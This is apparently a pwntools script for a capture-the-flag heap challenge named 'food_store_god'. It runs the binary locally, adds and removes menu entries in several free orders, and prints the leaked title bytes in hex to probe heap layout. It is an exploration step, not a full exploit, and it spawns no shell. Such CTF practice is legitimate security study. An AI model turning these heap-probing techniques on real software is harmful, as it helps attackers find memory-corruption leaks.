import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
os.environ['LOG']='error'
from pwn import *
DIR='/mnt/c/Users/ha/Downloads/pwn'
def run(order):
    p=process([DIR+'/ld-2.24.so','--library-path',DIR,DIR+'/food_store_god'],env={'LD_LIBRARY_PATH':DIR})
    def ru(x,**k): return p.recvuntil(x,**k)
    def sl(x): p.sendline(x if isinstance(x,bytes) else str(x).encode())
    ru(b'Your name: '); sl(b'AAAA')
    def add(t,ings=(b'0',)):
        ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'1'); ru(b'Magic : '); m=p.recvline().strip()
        ru(b'Title :'); sl(t)
        for i,ing in enumerate(ings):
            ru(b'Choose ingredient :'); sl(ing); ru(b'Add more ingredient ? (1/Yes,2/No) : '); sl(b'1' if i<len(ings)-1 else b'2')
        ru(b'Your choice: '); sl(b'4'); return m
    def make(nm): ru(b'Your choice: '); sl(b'4'); ru(b'Your choice: '); sl(b'3'); ru(b'Ingredient :'); sl(nm); ru(b'Your choice: '); sl(b'4')
    def rm(t): ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'2'); ru(b'Title :'); sl(t); ru(b'Your choice: '); sl(b'4')
    add(b'A1'); add(b'B2'); make(b'b1'); add(b'YY'); add(b'Z9'); make(b'b3')
    for op in order: rm(op)
    add(b'CC')
    ru(b'Your choice: '); sl(b'1'); ru(b'Your choice: '); sl(b'3')
    import time; time.sleep(0.3); d=p.recvrepeat(0.8)
    import re; ts=re.findall(rb'Title : ([^\n]*)', d)
    alive=p.poll() is None
    p.close()
    return ts, alive
for order in [[b'B2',b'Z9',b'A1',b'YY'], [b'B2',b'Z9',b'YY',b'A1'], [b'Z9',b'B2',b'A1',b'YY']]:
    ts,alive=run(order)
    print("order",order,"alive",alive)
    for t in ts[2:]: print("   ",t, t.hex())
